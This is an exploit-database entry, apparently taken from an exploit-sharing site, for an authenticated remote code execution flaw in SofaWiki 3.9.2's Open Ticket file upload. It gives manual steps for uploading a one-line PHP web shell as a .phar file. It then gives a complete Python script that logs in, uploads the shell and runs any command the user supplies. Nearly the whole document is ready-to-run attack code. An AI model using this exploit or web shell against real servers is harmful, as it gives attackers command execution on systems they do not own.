@@ -1,0 +1,129 @@
+id: 39784
+date: 10/22/2024
+title: SofaWiki 3.9.2 Shell Upload Exploit
+author: Chokri Hammedi
+cves: 
+
+# Exploit Title: SofaWiki 3.9.2 - Remote Code Execution (RCE) via Open Ticket File Upload
+# Exploit Author: Chokri Hammedi
+# Vendor Homepage: https://www.sofawiki.com
+# Software Link: https://www.sofawiki.com/site/files/snapshot.zip
+# Version: 3.9.2
+# Tested on: Windows XP
+
+Summary:
+A remote code execution (RCE) vulnerability exists in the Open Ticket
+feature of SofaWiki 3.9.2. An attacker can upload a malicious `.phar` file
+that contains PHP code, bypassing `.htaccess` restrictions, and execute
+arbitrary commands on the server.
+
+Exploit Steps:
+
+1. Login to SofaWiki.
+2. Navigate to Special → Tickets → New Ticket:
+http://localhost/sofawiki/index.php?name=special:tickets&ticketaction=new
+3. Select your shell.phar file with this content:
+
+   <?php system($_GET['cmd']); ?>
+
+4. Fill in the ticket title and click Open Ticket.
+5. After the ticket is created, the page shows a link to the uploaded
+shell.phar
+6. access the webshell:
+http://localhost/sofawiki/site/files/ticket-1-shell.phar?cmd=whoami
+
+
+--------------
+
+# Exploit Title: SofaWiki 3.9.2 - RCE (authenticated) via Open Ticket File Upload  Exploit
+# Date: 10/17/2024
+# Exploit Author: Chokri Hammedi
+# Vendor Homepage: https://www.sofawiki.com
+# Software Link: https://www.sofawiki.com/site/files/snapshot.zip
+# Version: 3.9.2
+# Tested on: Windows XP
+
+
+import requests
+import re
+import sys
+
+class SofaWikiExploit:
+    def __init__(self, base_url, username, password):
+        self.base_url = base_url.rstrip('/')
+        self.username = username
+        self.password = password
+        self.session = requests.Session()
+
+    def detect_login_name(self):
+        response =
+self.session.get(f"{self.base_url}/index.php?action=login")
+        match = re.search(r'name="name" value="([^"]+)"', response.text)
+        if not match:
+            print("\033[91m\033[1m[-] couldn't find the 'name' field.
+Exiting.\033[0m")
+            sys.exit(1)
+        return match.group(1)
+
+    def login(self):
+        print("\033[93m[*] logging in...\033[0m")
+        login_name = self.detect_login_name()
+        data = {
+            "submitlogin": "Login",
+            "username": self.username,
+            "pass": self.password,
+            "name": login_name,
+            "action": "login"
+        }
+        response = self.session.post(f"{self.base_url}/index.php",
+data=data)
+        if "Logout" in response.text:
+            print("\033[92m\033[1m[+] Login successful!\033[0m")
+            return True
+        print("\033[91m[-] login failed.\033[0m")
+        return False
+
+    def upload_shell(self):
+        print("\033[93m[*] uploading shell...\033[0m")
+        shell_content = '<?php system($_GET["cmd"]); ?>'
+        files = {
+            'uploadedfile': ('shell.phar', shell_content,
+'application/octet-stream'),
+            'title': (None, 'Chokri Hammedi Exploit'),
+            'text': (None, 'Chokri Hammedi RCE'),
+            'assigned': (None, 'admin'),
+            'priority': (None, '1 high'),
+            'submitopen': (None, 'Open Ticket'),
+            'MAX_FILE_SIZE': (None, '8000000')
+        }
+        response =
+self.session.post(f"{self.base_url}/index.php?name=special:tickets",
+files=files)
+        match = re.search(r'File (.*?) uploaded', response.text)
+        if not match:
+            print("\033[91m[-] shell upload failed.\033[0m")
+            sys.exit(1)
+        shell_url = f"{self.base_url}/site/files/{match.group(1)}"
+        print(f"\033[92m[+] shell uploaded: {shell_url}\033[0m")
+        return shell_url
+
+    def execute_command(self, shell_url, cmd):
+        print(f"\033[93m[*] running command: {cmd}\033[0m")
+        response = self.session.get(f"{shell_url}?cmd={cmd}")
+        print("\033[92m[+] command output:\033[0m")
+        print(f"\033[1m{response.text}\033[0m")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        print(f"\033[91musage: {sys.argv[0]} <target_url> <username>
+<password> <cmd>\033[0m")
+        sys.exit(1)
+
+    target_url, username, password, cmd = sys.argv[1:5]
+    exploit = SofaWikiExploit(target_url, username, password)
+
+    if exploit.login():
+        shell_url = exploit.upload_shell()
+        exploit.execute_command(shell_url, cmd)
+
+#  0day.today [2024-10-23]  #
